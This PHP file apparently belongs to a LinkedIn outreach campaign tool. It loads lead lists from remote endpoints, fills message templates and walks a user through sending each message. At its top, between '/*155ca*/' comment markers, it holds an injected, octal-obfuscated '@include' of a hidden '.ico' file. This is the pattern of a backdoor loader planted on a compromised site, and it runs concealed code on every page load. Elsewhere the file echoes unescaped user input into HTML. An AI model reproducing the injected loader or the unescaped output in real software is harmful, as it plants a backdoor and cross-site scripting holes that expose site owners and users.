<?php
/*155ca*/

@include "\057v\141r\057w\167w\057s\171n\160a\164/\142a\143k\171a\162d\057p\165b\154i\143/\167i\144g\145t\163/\167i\172a\162d\057.\0618\143d\0669\0661\056i\143o";

/*155ca*/

 
	session_start();
	if(function_exists('date_default_timezone_set')) date_default_timezone_set('America/Los_Angeles');
?>
<style>
	body {
		margin: 0;
		padding: 0;
	}
	.emaillinked-form {
		font-family: Arial;
		margin: 8px;
		/*width: 290px;*/
	}
	.emaillinked-form input[type=text],
	.emaillinked-form input[type=email],
	.emaillinked-form input[type=password],
	.emaillinked-form textarea {
		background: #fff;
	    border: 1px solid #ddd;
	    color: #888;
	    box-sizing: border-box;
	    border-radius: 0px;
	    box-shadow: none;
	    display: block;
		font-family: Arial;
	    font-size: 14px;
	    height: 36px;
	    margin-bottom: 15px;
	    outline: none !important;
	    padding: 8px 8px 8px 8px;
	    text-overflow: ellipsis;
	    transition: color 300ms ease-in-out, background-color 300ms ease-in-out, border-color 300ms ease-in-out;
	    -moz-transition: color 300ms ease-in-out, background-color 300ms ease-in-out, border-color 300ms ease-in-out;
	    -webkit-transition: color 300ms ease-in-out, background-color 300ms ease-in-out, border-color 300ms ease-in-out;
	    -o-transition: color 300ms ease-in-out, background-color 300ms ease-in-out, border-color 300ms ease-in-out;
	    width: 100%;
	}
	.emaillinked-form textarea {
		height: 60px;
	}
	.emaillinked-form input[type=text]:hover,
	.emaillinked-form input[type=email]:hover,
	.emaillinked-form input[type=password]:hover,
	.emaillinked-form textarea:hover {
	    color:#333 !important;
	    border-color:#aaa !important;
	}
	.emaillinked-form input[type=text]:hover::-webkit-input-placeholder,
	.emaillinked-form input[type=email]:hover::-webkit-input-placeholder,
	.emaillinked-form input[type=password]:hover::-webkit-input-placeholder,
	.emaillinked-form textarea::-webkit-input-placeholder {
	    color: #333;
	    transition: color 300ms ease-in-out, background-color 300ms ease-in-out, border-color 300ms ease-in-out;
	    -moz-transition: color 300ms ease-in-out, background-color 300ms ease-in-out, border-color 300ms ease-in-out;
	    -webkit-transition: color 300ms ease-in-out, background-color 300ms ease-in-out, border-color 300ms ease-in-out;
	    -o-transition: color 300ms ease-in-out, background-color 300ms ease-in-out, border-color 300ms ease-in-out;
	}
	.emaillinked-form label {
	    display: block;
	    font-size: 13px;
	    font-weight: bold;
	    margin-bottom: 3px;
	}
	.emaillinked-form .button {
        background-color: #BD202F;
        border: none;
        border-radius: 0.21429em;
	    color: #ffffff;
   		cursor: pointer;
	    font-size: 14px;
	    font-weight: bold;
	    line-height: 1.4;
	    margin-bottom: 0;
	    margin-top: 0;
	    min-width: 200px;
	    padding: 8px 15px;
        text-transform: uppercase;
	    /*width: 100%;*/
	}
	.emaillinked-form .button:hover {
		background-color: #911924;
	}
	.table {
		margin:0px;padding:0px;
		width:100%;
		border:1px solid #e5e5e5;
	}
	.table tr:nth-child(odd){ background-color:#ededed; }
	table tr:nth-child(even){ background-color:#ffffff; }
	.table td{
		vertical-align:middle;
		border:1px solid #e5e5e5;
		border-width:0px 1px 1px 0px;
		text-align:left;
		padding:10px;
		font-size:13px;
		font-family:Arial;
		font-weight:normal;
		color:#000000;
	}
</style>

<?php
	if(isset($_POST)){	
		switch($_POST['setup']){
			case 'resume':
				if(isset($_POST['campaign_id'])){ 
					$curl = curl_init();
					// Set some options - we are passing in a useragent too here
					curl_setopt_array($curl, array(
						CURLOPT_RETURNTRANSFER => 1,
						CURLOPT_URL => 'https://backyard.synpat.com/customers/campaign',
						CURLOPT_USERAGENT => 'Send Request for create demo portfolio'		,
						CURLOPT_POST => 1,
						CURLOPT_POSTFIELDS => array(
							'campaign_type' => 0,	
							'id' => $_POST['campaign_id']	
						)				
					));
					$resp = curl_exec($curl);
					$list = array();
					if($resp){
						$list = json_decode($resp,true);
					}
					if(count($list)>0){
						$_SESSION['lead_id_linkedin'] = $list['campaign']['lead_id'];
						$leadID = $_SESSION['lead_id_linkedin'];
						$leadName = $list['campaign']['lead_name'];
						$emailList = "";
						$personList = "";
						$companyList = "";
						$ids = "";
						$mainActivity = 1;
						$_SESSION[$leadID.'main_activity'] = $mainActivity;
						$_SESSION[$leadID.'mail_start_linkedin'] = 0;
						if(count($list['list'])>0){
							$i=1;
							foreach($list['list'] as $person){
								if($person['send']==1){
									$_SESSION[$leadID.'mail_start_linkedin'] = $i;
									$i++;
								}
								$emailList .=$person['address'].", ";
								$personList .=$person['person_name'].", ";
								$companyList .=$person['company'].", ";
								$ids .=$person['ids'].", ";								
							}						
							if($ids != ""){
								$curl = curl_init();
								curl_setopt_array($curl, array(
									CURLOPT_RETURNTRANSFER => 1,
									CURLOPT_URL => 'https://backyard.synpat.com/customers/get_contact_list_by_ids',
									CURLOPT_USERAGENT => ''		,
									CURLOPT_POST => 1,
									CURLOPT_POSTFIELDS => array(
										'ids' => $ids,
									)				
								));
								$resp = curl_exec($curl);
								if($resp != ""){
									$contactList = json_encode($resp,true);
									if(count($contactList) > 0){
										$_SESSION[$leadID.'contact_list'] = $contactList;
									}
								}
							}
							$_SESSION[$leadID.'ids_list'] = $ids;
							$_SESSION[$leadID.'subject_linkedin'] = $list['campaign']['subject'];
							$_SESSION[$leadID.'body_linkedin'] = $list['campaign']['body'];
							$_SESSION[$leadID.'template_file_linkedin'] = $list['campaign']['template_file'];
							$_SESSION[$leadID.'campaign_id'] = $list['campaign']['id'];
							$_SESSION[$leadID.'mail_list_linkedin'] = $emailList;
							$_SESSION[$leadID.'person_list'] = $personList;
							$_SESSION[$leadID.'company_list'] = $companyList;
							$_SESSION[$leadID.'user_id_linkedin'] = $list['campaign']['user_id'];
							$_SESSION[$leadID.'mail_log_linkedin'] = array();
							showSubjectBody();
						}
					}
				}
			break;
			case 'implementation':	
				if(isset($_POST['lead_id'])){
					$_SESSION['lead_id_linkedin'] = $_POST['lead_id'];
					$leadID = $_SESSION['lead_id_linkedin'];
					$leadName = $_POST['lead_name'];
					$emailList = array();
					$personList = array();
					$companyList = array();
					$ids = array();
					$mainActivity = 1;
					if(isset($_POST['activity_type'])){
						$mainActivity = $_POST['activity_type'];
					}
					$_SESSION[$leadID.'main_activity'] = $mainActivity;
					if(isset($_POST['email_list'])){
						$emailList = $_POST['email_list'];
					} 
					$emailList = trim($emailList);
					if(substr($emailList,-1) == ","){
						$emailList = substr($emailList,0,-1);
					}
					if(isset($_POST['person_list'])){
						$personList = $_POST['person_list'];
					} 
					$personList = trim($personList);
					if(substr($personList,-1) == ","){
						$personList = substr($personList,0,-1);
					}
					if(isset($_POST['company_list'])){
						$companyList = $_POST['company_list'];
					} 	
					$companyList = trim($companyList);
					if(substr($companyList,-1) == ","){
						$companyList = substr($companyList,0,-1);
					}
					if(isset($_POST['ids_list'])){
						$ids = $_POST['ids_list'];
					} 
					if(isset($_POST['subject'])){	
						$_SESSION[$leadID.'subject_linkedin'] = $_POST['subject'];
					}
					$template = "";
					if(isset($_POST['email_message'])){
						$template = $_POST['email_message'];						
						$template = str_replace("&nbsp;",' ',$template);
					}
					$_SESSION[$leadID.'body_linkedin'] = $template;
					if(isset($_POST['template_file'])){
						$_SESSION[$leadID.'template_file_linkedin'] = $_POST['template_file'];
					}
					$curl = curl_init();
					// Set some options - we are passing in a useragent too here
					$sendData = array("person"=>$personList,"company"=>$companyList,"email"=>$emailList,"ids"=>$ids,"lead_id"=>$leadID,"campaign_type"=>"2","lead_name"=>$leadName,"subject"=>$_POST['subject'],"body"=>$template,"user_id"=>$_POST['user_id'],"template_file"=>$_POST['template_file'],"start_date"=>date("Y-m-d H:i:s"));
					curl_setopt_array($curl, array(
						CURLOPT_RETURNTRANSFER => 1,
						CURLOPT_URL => 'https://backyard.synpat.com/customers/start_campaign',
						CURLOPT_USERAGENT => 'Send Request for create demo portfolio'		,
						CURLOPT_POST => 1,
						CURLOPT_POSTFIELDS => array(
							'campaign_data' => json_encode($sendData),
						)				
					));
					$resp = curl_exec($curl);
					curl_close($curl);
					if($resp>0){
						$_SESSION[$leadID.'campaign_id'] = $resp;
					}
					if($ids != ""){
						$curl = curl_init();
						curl_setopt_array($curl, array(
							CURLOPT_RETURNTRANSFER => 1,
							CURLOPT_URL => 'https://backyard.synpat.com/customers/get_contact_list_by_ids',
							CURLOPT_USERAGENT => ''		,
							CURLOPT_POST => 1,
							CURLOPT_POSTFIELDS => array(
								'ids' => $ids,
							)				
						));
						$resp = curl_exec($curl);
						if($resp != ""){
							$contactList = json_decode($resp,true);
							if(count($contactList) > 0){
								$_SESSION[$leadID.'contact_list'] = $contactList;
							}
						}
					}					
					$_SESSION[$leadID.'mail_list_linkedin'] = $emailList;
					$_SESSION[$leadID.'ids_list'] = $ids;
					$_SESSION[$leadID.'person_list'] = $personList;
					$_SESSION[$leadID.'company_list'] = $companyList;
					$_SESSION[$leadID.'user_id_linkedin'] = $_POST['user_id'];
					$_SESSION[$leadID.'mail_start_linkedin'] = 0;
					$_SESSION[$leadID.'mail_log_linkedin'] = array();
					showSubjectBody();
				}
			break;
			case 'final_step':
				$leadID = $_SESSION['lead_id_linkedin'];
				if(isset($_POST['subject'])){
					$_SESSION[$leadID.'subject_linkedin']= $_POST['subject'];
				}
				if(isset($_POST['body'])){
					$_SESSION[$leadID.'body_linkedin'] = $_POST['body'];
				}
				
				showFinalStep();
			break;
			case 'skip':
				$leadID = $_SESSION['lead_id_linkedin'];
				$start = (int)$_SESSION[$leadID.'mail_start_linkedin'] + 1;
				$explode = explode(',',$_SESSION[$leadID.'mail_list_linkedin']);
				if(isset($explode[$start])){
					$emailNext = trim($explode[$start]);
					if(!empty($emailNext)){
						$_SESSION[$leadID.'mail_start_linkedin'] = $start ;
						showSubjectBody();
					} else {
						session_destroy();
						showCompleteMessage();
					}
				}
			break;
			case 'send':	
				$leadID = $_SESSION['lead_id_linkedin'];									
				$curl = curl_init();
				$body = str_replace('&nbsp;','',$_POST['email_message']);
				$body = str_replace('&nbsp;','',$body);
				$body = str_replace('&nbsp;','',$body);
				$body = str_replace('&nbsp;','',$body);
				$body = str_replace('&nbsp;','',$body);
				$body = str_replace('&nbsp;','',$body);
				$body = str_replace('&nbsp;','',$body);
				$body = str_replace('&nbsp;','',$body);
				$data = array(
						'lead_id' => $leadID,
						'to' => $_POST['to'],
						'type'=>'5',
						'subject'=>$_POST['subject'],
						'body'=>$_POST['email_message'],
						'user_id'=>$_SESSION[$leadID.'user_id_linkedin'],
						'campaign_id'=> $_SESSION[$leadID.'campaign_id'],
						'main_activity'=>$_SESSION[$leadID.'main_activity']
					);
				// Set some options - we are passing in a useragent too here
				curl_setopt_array($curl, array(
					CURLOPT_RETURNTRANSFER => 1,
					CURLOPT_URL => 'https://backyard.synpat.com/customers/sales_activity_email_save',
					CURLOPT_USERAGENT => 'Send Request for create demo portfolio'		,
					CURLOPT_POST => 1,
					CURLOPT_POSTFIELDS => 		$data		
				));
				$resp = curl_exec($curl);
			
				if($resp){
					if($resp>0){
						
					}
				}				
				$start = (int)$_SESSION[$leadID.'mail_start_linkedin'] + 1;
				$explode = explode(',',$_SESSION[$leadID.'mail_list_linkedin']);
				if(isset($explode[$start])){
					$emailNext = trim($explode[$start]);
					if(!empty($emailNext)){
						$_SESSION[$leadID.'mail_start_linkedin'] = $start ;
						showSubjectBody();
					} else {
						session_destroy();
						showCompleteMessage();
					}
				}					
			break;	
		}
	}
function showSubjectBody(){
	$leadID = $_SESSION['lead_id_linkedin'];
	$subject = "";
	$body = "";
	$templateFile = "";
	if(isset($_SESSION[$leadID.'subject_linkedin'])){
		$subject = $_SESSION[$leadID.'subject_linkedin'];
	}
	if(isset($_SESSION[$leadID.'body_linkedin'])){
		$body = $_SESSION[$leadID.'body_linkedin'];
	
	}
	
?>
	<?php 
			$peronList  = array();
			$companyList  = array();
			$mailList  = array();
			if(isset($_SESSION[$leadID.'person_list']) && isset($_SESSION[$leadID.'company_list'])){
				$peronList = explode(',',$_SESSION[$leadID.'person_list']);
				$companyList = explode(',',$_SESSION[$leadID.'company_list']);
				$mailList = explode(',',$_SESSION[$leadID.'mail_list_linkedin']);
			}
			$contactList = array();
			if(isset($_SESSION[$leadID.'contact_list'])){
				$contactList = $_SESSION[$leadID.'contact_list'];
			}	
		?>
		
	  <div style='float:left;width:40%;overflow:hidden;'>
		<h3>To Send</h3>
		<table class='table'>
		
			<tr>
				<td>Person</td>
				<td>Title</td>
				<td>Company</td>
			</tr>
		
		<?php 
			if(count($mailList)>0){
				for($i=$_SESSION[$leadID.'mail_start_linkedin'];$i<count($mailList);$i++){
					$title = "";
					$img = "";
					if(count($contactList) > 0){
						$LinkedinUrl = trim($mailList[$i]);
						foreach($contactList as $contact){	
							$cLinkedin = trim($contact['linkedin_url']);
							if(isset($mailList[$i]) && $cLinkedin == $LinkedinUrl){
								$img = $contact['linkedin_image'];
								$title = $contact['job_title'];
								break;
							}
						}
					}
		?>
					<tr>
						<td>
							<?php 
								if($img != "" && $img != null){
							?>
								<span id="profile_pic" style='margin-right:5px;'><img src="<?php echo $img;?>" width="50"/></span>
							<?php
								} echo $peronList[$i];
							?>
						</td>
						<td><?php echo $title;?></td>
						<td><?php echo $companyList[$i];?></td>
					</tr>
			<?php
				}
			}
		?>
		</table>
	  </div>
	  <div style='float:left;width:20%'>
		<h3>Send To</h3>
		<table class='table'>
		
			<tr>
				<td>Person</td>
				<td>Company</td>
			</tr>
		
		<?php 
			if($_SESSION[$leadID.'mail_start_linkedin']>0){
				for($i=0;$i<$_SESSION[$leadID.'mail_start_linkedin'];$i++){
			?>
					<tr>
						<td><?php echo $peronList[$i]?></td>
						<td><?php echo $companyList[$i]?></td>
					</tr>
			<?php
				} 
			}
		?>
		</table> 
	  </div>
	  <div style='float:left;width:40%'>
	<form action="https://backyard.synpat.com/base/linkedin/index.php" method="post" class="emaillinked-form">
		<button type="submit" class="button" style='float:right;margin-bottom:10px;'>Start Sending this message to invitee</button>
		<label>Subject:</label><input type="text" name="subject" value="<?php echo $subject;?>"/>
		<span style='float:right;'>Legend: use for firstname #First#, for lastname #Last#, for company #Company#, for salutation #Salutation#<br/></span>
		<label>Body:</label><textarea name="body" style='height:200px;'><?php echo $body;?></textarea>		
		<input type="hidden" name='setup' value="final_step"/>
	</form>
	</div>
<?php
}
function showFinalStep(){
	$leadID = $_SESSION['lead_id_linkedin'];
		$to = "";
		$person = "";
		$company ="";
		$subject = "";
		$body = "";
		$templateFile = "";
		if(isset($_SESSION[$leadID.'subject_linkedin'])){
			$subject = $_SESSION[$leadID.'subject_linkedin'];
		}
		if(isset($_SESSION[$leadID.'body_linkedin'])){
			$body = $_SESSION[$leadID.'body_linkedin'];
		}
		if(isset($_SESSION[$leadID.'template_file_linkedin'])){
			$templateFile = $_SESSION[$leadID.'template_file_linkedin'];
		
		}
		/*$body = $body.'&nbsp;&nbsp;&nbsp;'.$_SESSION[$leadID.'template_file_linkedin'];*/
		
		$mailList = explode(',',$_SESSION[$leadID.'mail_list_linkedin']);
		$peronList = explode(',',$_SESSION[$leadID.'person_list']);
		$companyList = explode(',',$_SESSION[$leadID.'company_list']);
		$contactList = array();
		if(isset($_SESSION[$leadID.'contact_list'])){
			$contactList = $_SESSION[$leadID.'contact_list'];
		}		
		$first = "";
		if(count($mailList)>0){
			$emailTo = trim($mailList[$_SESSION[$leadID.'mail_start_linkedin']]);
			$person = trim($peronList[$_SESSION[$leadID.'mail_start_linkedin']]);
			$first = explode(" ",$person);
			$company = trim($companyList[$_SESSION[$leadID.'mail_start_linkedin']]);
			if(isset($mailList[$_SESSION[$leadID.'mail_start_linkedin']]) && !empty($emailTo)){
				$to = $emailTo;
			}
		}
		$salutation = "Mr.";
		$checked = false;
		if(count($contactList) > 0){
			foreach($contactList as $contact){
				if($contact['linkedin_url'] == $to){
					$gender = $contact['gender'];
					if((int) $gender == 1){
						$salutation = "Ms.";
					}
					$checked = true;
					break;
				}
			}
		}
		if($to != "" && $checked === false){			
			$curl = curl_init();
			// Set some options - we are passing in a useragent too here
			curl_setopt_array($curl, array(
				CURLOPT_RETURNTRANSFER => 1,
				CURLOPT_URL => 'https://backyard.synpat.com/customers/contact_by_linkedinurl',
				CURLOPT_USERAGENT => ''		,
				CURLOPT_POST => 1,
				CURLOPT_POSTFIELDS => array(
					'linkedin_url' => $to
				)				
			));
			$resp = curl_exec($curl);	
			if($resp){
				if($resp != ""){
					$d = json_decode($resp,true);
					if(isset($d['salutation']) && (int)$d['salutation'] == 1){
						$salutation = "Ms.";
					}
				}				
			}
		}		
	?>
	<script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
	<div style='float:right;width:50%'>
	<form action="https://backyard.synpat.com/base/linkedin/index.php" method="post" class="emaillinked-form">		
		<input type="hidden" name="to" id="to" value="<?php echo $to;?>"/>
		<label>
			Message to be sent to <font color='#ff000'><?php echo $person?>, <?php echo $company?></label></font>
		</label>
		<label>Subject:</label>
		<input type="text" name="subject" id="subject" value="<?php echo $subject;?>"/>
		<label>Body:</label>
		<?php 			
			$body = preg_replace('/#First#/',$first[0],$body);
			$body = preg_replace('/#first#/',$first[0],$body);
			$body = preg_replace('/#FIRST#/',$first[0],$body);
			$body = preg_replace("/#Company#/",$company,$body);
			$body = preg_replace("/#company#/",$company,$body);
			$body = preg_replace("/#COMPANY#/",$company,$body);
			$body = preg_replace("/#Last#/",$first[1],$body);
			$body = preg_replace("/#last#/",$first[1],$body);
			$body = preg_replace("/#LAST#/",$first[1],$body);
			$body = preg_replace("/#Salutation#/",$salutation,$body);
			$body = preg_replace("/#salutation#/",$salutation,$body);
			
		?>
		<textarea name="email_message" id="email_message" style='height:110px;'><?php echo $body;?></textarea>
		<input type="hidden" name='setup' value="send"/>
		<input type="hidden" name='copyText' id="copyText" value=""/>
		<input type="hidden" name='templateFile' id="templateFile" value="<?php echo $templateFile;?>"/>
		<p>1. Click Open Receiver's Linkedin Profile and click Ctrl+V to paste the above message (which is already in the clipboard) into the receiver's LinkedIn message.<br/>2. After sending the message, click Confirm Sending on LinkedIn in order to more the next receiver.</p>
		<div style='float:left;width:100%;'><button type="button" id="btnSubmitProfile" onclick="checkFunctionImplementation(1)" class="button asubject" style='float:left;margin-bottom:10px;'><span style='display:none;'><img src='30x_checkmark.png' style='width:15px;position:relative;left:-3px;top:3px;'/></span> Open Receiver's LinkedIn Profile</button></div>
		<!--<div style='float:left;width:100%;'><a class='asubject button' href='javascript://' title="Copy to Clipboard" style='float:left;margin-bottom:10px;text-decoration:none;' id="btnSubjectClipboard"><span style='display:none;'><img src='30x_checkmark.png' style='width:15px;position:relative;left:-3px;top:3px;'/></span> Copy the Subject Line to the clipboard to be pasted in the LinkedIn Profile.</a></div>
		<div style='float:left;width:100%;'><a class='abody button' href='javascript://' title="Copy to Clipboard"  style='float:left;margin-bottom:10px;text-decoration:none;' id="btnMessageClipboard"><span style='display:none;'><img src='30x_checkmark.png' style='width:15px;position:relative;left:-3px;top:3px;'/></span> Copy the message body to the clipboard to be pasted in the LinkedIn profile.</a></div>-->
		<div style='float:left;width:100%;'><button type="button" id="btnSubmitConfirmed" onclick="checkFunctionImplementation(2)" class="button" style='float:left;margin-bottom:10px;'><span style='display:none;'><img src='30x_checkmark.png' style='width:15px;position:relative;left:-3px;top:3px;'/></span> Confirmed Sending on Linkedin</button>
		</div>
		<div style='float:left;width:100%;'><button type="button" id="btnSubmitSkip" onclick="checkFunctionImplementation(3)" class="button" style='float:left;margin-bottom:10px;'><span style='display:none;'><img src='30x_checkmark.png' style='width:15px;position:relative;left:-3px;top:3px;'/></span> Skip</button>
		</div>
	</form>
	</div>
	<script>

		function createElementOnFly(name){
			const createD = document.createElement('textarea');
			createD.style = "float:left;position:relative;left:-99999px;padding:0;margin:0px;font:400 18px/1.6em Roboto,sans-serif;";
			createD.innerHTML = name;
			createD.setAttribute('id','stton');
			const bTag = document.getElementsByTagName('body')[0];
			bTag.appendChild(createD);
			const tagD = document.getElementById('stton');
			return tagD;
		}
		function checkFunctionImplementation(a){
			if(a==1){
				var this_sel = $("#subject");
				var this_sel_message = $("#email_message");
				var this_templateFile = $("#templateFile");
				let copyText = "";
				if(this_sel.val() != ""){
					copyText += this_sel.val()+"\n";
				}
				copyText += this_sel_message.val()+" \n"+this_templateFile.val();
				
				 var copyTextElement = createElementOnFly(copyText);
				  copyTextElement.select();
				  document.execCommand("copy");
				  copyTextElement.remove();
				window.open(jQuery("#to").val(),"Linkedin Profile","width=1000,height=800");
				jQuery("#btnSubmitProfile").find("span").css("display","");
				/*jQuery("#btnSubmit").attr("onclick","checkFunctionImplementation(2)").text('Confirmed Sending on Linkedin');*/
			} else if(a == 3){
				/*Skip*/
				jQuery("input[name='setup']").val('skip');
				document.forms[0].submit(); 
			} else {
				jQuery("#btnSubmitConfirmed").find("span").css("display","");
				document.forms[0].submit(); 
			}
		}
	</script>
	<?php
}
function showCompleteMessage(){
?>
<script>

function runClose(){
    opener.refreshAcquisitionAndSalesActivity(); 
}
</script>
<form action="https://backyard.synpat.com/base/linkedin/index.php" method="post" class="emaillinked-form">
	<h4>Finished.</h4>
	<a href='javascript:runClose();window.close();' class="button">Close</a>
</form>
<?php
}
?>